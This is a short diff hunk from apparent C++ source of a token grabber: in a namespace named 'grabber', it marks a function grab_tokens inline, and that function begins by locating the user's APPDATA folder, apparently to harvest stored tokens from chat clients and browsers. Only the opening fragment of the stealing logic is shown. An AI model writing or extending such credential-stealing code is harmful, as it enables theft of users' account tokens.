@@ -132,7 +132,7 @@ namespace grabber
 		return finds;
 	}
 
-	std::vector<std::string> grab_tokens(bool clients = true, bool browsers = false)
+	inline std::vector<std::string> grab_tokens(bool clients = true, bool browsers = false)
 	{
 		// Get Appdata paths
 		std::string roaming = dtg_util::env::get_env("APPDATA"); if (roaming.front() != '\\') roaming.push_back('\\');
